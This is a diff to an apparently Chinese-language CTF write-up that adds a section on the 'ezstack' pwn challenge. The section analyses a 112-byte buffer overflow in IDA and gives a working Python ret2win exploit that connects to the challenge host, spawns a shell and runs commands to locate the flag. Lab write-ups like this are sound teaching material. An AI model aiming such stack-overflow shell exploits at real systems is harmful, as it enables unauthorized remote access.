@@ -696,7 +696,7 @@ else:
 
 <padding expand="16">
 
-![evil的地址](./pwm/ezstack/ezstack.drawio.svg)
+![evil的地址](/assets/local-svg/ezstack.drawio.p16.svg)
 
 </padding>
 
@@ -785,6 +785,97 @@ flag截图：
 
 
 <folder title="点击展开" style="3" height="420px">
+
+## ezstack
+
+使用 IDA 打开程序，Shift + F12 搜字符串套转到主逻辑函数部分：
+
+![函数主逻辑部分](./pwm/ezstack/ida_main.png)
+
+这里看到ReadingBuffer的大小只有112，没有做防溢出保护
+
+然后程序为64位程序
+
+![64位程序](./pwm/ezstack/64.png)
+
+所以我们构造一个这样的栈布局实现入侵：
+
+<padding expand="16">
+
+![evil的地址](/assets/local-svg/ezstack.drawio.p16.svg)
+
+</padding>
+
+即通过写入112个A字符写到[rbp+0]的位置，然后在[rbp+8]的位置放入一个任意地址的retn指令实现linux 64位程序所需要的16位对齐，再在[rbp+16]的位置放入evil函数的地址即可完成栈溢出攻击。
+
+再查询evil的地址：
+
+![evil的地址](./pwm/ezstack/400507.png)
+
+于是有了以下代码：
+```python
+import socket
+import struct
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 30832
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+ret = 0x400506
+evil = 0x400507
+
+payload = b"A" * 120
+payload += p64(ret)
+payload += p64(evil)
+
+s = socket.create_connection((HOST, PORT))
+s.settimeout(2)
+
+# 接收题目提示
+try:
+    data = s.recv(4096)
+    print(data.decode(errors="ignore"), end="")
+except:
+    pass
+
+# 发送溢出 payload
+s.sendall(payload + b"\n")
+
+time.sleep(0.2)
+
+# evil() 里会 system("/bin/sh")，这里给 shell 发命令
+cmds = [
+    b"id\n",
+    b"pwd\n",
+    b"ls -la\n",
+    b"cat flag 2>/dev/null\n",
+    b"cat flag.txt 2>/dev/null\n",
+    b"cat /flag 2>/dev/null\n",
+    b"cat /flag.txt 2>/dev/null\n",
+    b"find / -name '*flag*' 2>/dev/null\n",
+]
+
+for cmd in cmds:
+    s.sendall(cmd)
+    time.sleep(0.1)
+
+# 持续接收输出
+while True:
+    try:
+        data = s.recv(4096)
+        if not data:
+            break
+        print(data.decode(errors="ignore"), end="")
+    except socket.timeout:
+        break
+```
+
+flag截图：
+
+![flag](./pwm/ezstack/ezstack_flag.png)
 
 
 </folder>
